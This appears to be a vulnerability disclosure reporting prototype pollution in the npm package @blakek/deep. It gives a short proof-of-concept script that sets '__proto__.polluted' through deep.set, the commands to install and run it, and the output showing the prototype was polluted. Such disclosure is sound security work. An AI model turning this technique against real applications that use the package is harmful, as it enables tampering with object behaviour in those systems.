# Description

`@blakek/deep` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var deep = require("@blakek/deep")
var obj = {}
console.log("Before : " + obj.polluted);
deep.set('Yes! Its Polluted', '__proto__.polluted', obj);
console.log("After : " + obj.polluted);
```


2. Execute the following commands in terminal:

```
npm i @blakek/deep # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
